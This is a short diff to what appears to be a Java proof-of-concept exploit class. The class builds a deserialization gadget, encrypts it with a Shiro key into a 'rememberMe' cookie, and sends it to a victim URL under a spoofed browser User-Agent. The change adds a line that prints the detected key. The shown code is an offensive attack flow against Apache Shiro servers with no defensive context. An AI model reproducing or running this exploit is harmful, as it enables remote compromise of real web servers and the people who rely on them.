@@ -81,6 +81,7 @@ public class poc {
         byte[] bytes = MakeGadget();
         String rememberMe = EncryptUtil.shiroEncrypt(key, bytes);
         HttpGet request = new HttpGet(victimUrl);
+        System.out.println(String.format("Detect key:%s",key));
         request.setHeader(HttpHeaders.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36");
         request.setHeader("Cookie", "rememberMe=" + rememberMe);
         CloseableHttpResponse response = httpclient.execute(request);
